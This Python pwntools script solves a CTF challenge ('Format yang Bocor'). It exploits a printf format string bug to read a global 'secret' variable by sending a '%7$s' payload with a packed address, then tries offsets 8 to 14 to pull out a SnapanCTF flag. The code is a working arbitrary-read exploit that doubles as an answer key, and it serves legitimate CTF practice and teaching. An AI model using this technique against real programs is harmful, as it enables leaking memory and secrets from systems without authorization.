#!/usr/bin/env python3
"""
Solver for Format yang Bocor challenge - Format string leak

Vulnerability: printf(user_input) allows format string attacks
Exploitation: Use %s with the address of the 'secret' global variable

The flag is stored in a global variable at a known address (no PIE).
Since the address contains null bytes, we put the format specifier first,
then the address, and use a higher offset.
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def exploit(host=None, port=None):
    # Load the binary
    if args.REMOTE or host:
        try:
            elf = ELF('./vuln', checksec=False)
        except:
            elf = ELF('../dist/vuln', checksec=False)
        io = remote(host or args.HOST, port or int(args.PORT))
    else:
        elf = ELF('./vuln', checksec=False)
        io = process('./vuln')
    
    # Find the address of the 'secret' variable
    secret_addr = elf.symbols['secret']
    log.info(f"secret variable at: {hex(secret_addr)}")
    
    # Wait for first prompt
    io.recvuntil(b'> ')
    
    # Since addresses have null bytes which break printf, we use a trick:
    # Put format specifier FIRST, then pad to 8-byte alignment, then address
    # Format: [%<offset>$s][padding][address]
    
    # From the probe, we know input starts at offset 6
    # We need to calculate where the address will land
    # If we do: "%9$sAAAA" + p64(addr) 
    # The "%9$s" is 4 bytes, "AAAA" is 4 bytes = 8 bytes = offset 6
    # p64(addr) is 8 bytes = offset 7
    # So we'd use %7$s
    
    # Let's try: "%7$sAAA" (7 bytes) + "A" (1 byte pad) + address (8 bytes)
    # Total before addr: 8 bytes = 1 qword at offset 6
    # Address at offset 7
    
    log.info("Attempting format string leak with address after format...")
    
    # Payload structure: format specifier + padding + address
    # Padding to align address to 8-byte boundary
    fmt = b'%7$s'  # 4 bytes
    padding = b'AAAA'  # 4 bytes to align
    addr = p64(secret_addr)  # 8 bytes
    
    payload = fmt + padding + addr
    log.info(f"Payload: {payload}")
    
    io.sendline(payload)
    
    try:
        response = io.recvuntil(b'> ', timeout=3)
        log.info(f"Response: {response}")
        
        if b'SnapanCTF{' in response:
            import re
            match = re.search(rb'SnapanCTF\{[^}]+\}', response)
            if match:
                flag = match.group(0).decode()
                log.success(f"Flag: {flag}")
                io.sendline(b'exit')
                io.close()
                return flag
    except Exception as e:
        log.error(f"Error: {e}")
    
    # Try other offsets if 7 didn't work
    for offset in range(8, 15):
        fmt = f'%{offset}$s'.encode()
        # Pad to 8 bytes
        pad_len = 8 - (len(fmt) % 8)
        if pad_len == 8:
            pad_len = 0
        padding = b'A' * pad_len
        payload = fmt + padding + addr
        
        log.info(f"Trying offset {offset}, payload len: {len(payload)}")
        io.sendline(payload)
        
        try:
            response = io.recvuntil(b'> ', timeout=2)
            log.info(f"Response: {response}")
            
            if b'SnapanCTF{' in response:
                import re
                match = re.search(rb'SnapanCTF\{[^}]+\}', response)
                if match:
                    flag = match.group(0).decode()
                    log.success(f"Flag: {flag}")
                    io.sendline(b'exit')
                    io.close()
                    return flag
        except:
            pass
    
    io.sendline(b'exit')
    io.close()
    log.warning("Could not find flag")

if __name__ == '__main__':
    if args.REMOTE or args.HOST:
        exploit()
    else:
        print("Run with: python solve.py REMOTE HOST=<ip> PORT=<port>")
        import os
        if os.path.exists('./vuln') or os.path.exists('../dist/vuln'):
            exploit()
